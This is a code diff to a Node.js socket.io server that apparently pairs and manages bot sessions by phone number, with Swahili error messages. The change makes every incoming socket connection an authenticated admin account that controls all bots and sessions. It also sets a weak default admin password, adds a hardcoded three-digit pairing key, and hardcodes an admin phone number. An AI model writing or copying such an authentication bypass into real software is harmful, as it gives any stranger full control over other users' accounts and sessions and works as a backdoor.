@@ -941,7 +941,8 @@ function accountResponse(account) {
 
 const ADMIN_PHONE = normalizeAccountPhone(process.env.ADMIN_PHONE || '255612130873');
 const ADMIN_FALLBACK_PHONE = '255612130873';
-const ADMIN_PASSWORD = String(process.env.ADMIN_PASSWORD || 'MICKEY24@').trim();
+const ADMIN_PASSWORD = String(process.env.ADMIN_PASSWORD || 'MICKEY').trim();
+const PAIR_ACCESS_KEY = '255';
 const ADMIN_EMAIL = String(process.env.ADMIN_EMAIL || process.env.ADMIN_EMAIL_ADDRESS || '').trim().toLowerCase();
 const ADMIN_TOKEN = String(process.env.ADMIN_TOKEN || '').trim();
 
@@ -4221,8 +4222,24 @@ async function loadExistingSessions() {
 io.on(
     'connection',
     (socket) => {
-        socket.account = null;
-        socket.authenticated = false;
+        const controlAccount = accounts.account_mickey_admin || {
+            id: 'account_mickey_admin',
+            name: 'MICKEY Control',
+            phone: ADMIN_PHONE,
+            isAdmin: true,
+            botIds: [],
+            createdAt: new Date().toISOString()
+        };
+        controlAccount.isAdmin = true;
+        controlAccount.botIds = [...new Set([
+            ...Object.values(accounts).flatMap((account) =>
+                Array.isArray(account?.botIds) ? account.botIds : []
+            ),
+            ...Object.keys(sessions)
+        ])];
+        accounts.account_mickey_admin = controlAccount;
+        socket.account = controlAccount;
+        socket.authenticated = true;
 
         socket.on(
             'admin-auth',
@@ -4398,8 +4415,14 @@ io.on(
         socket.on(
             'pair-request',
             async ({
-                number
+                number,
+                accessKey
             }) => {
+
+                if (String(accessKey || '').trim() !== PAIR_ACCESS_KEY) {
+                    socket.emit('pair-error', 'Access key si sahihi.');
+                    return;
+                }
 
                 if (!persistenceReady) {
                     socket.emit('pair-error', 'Server bado inaunganisha database. Jaribu tena baada ya sekunde chache.');
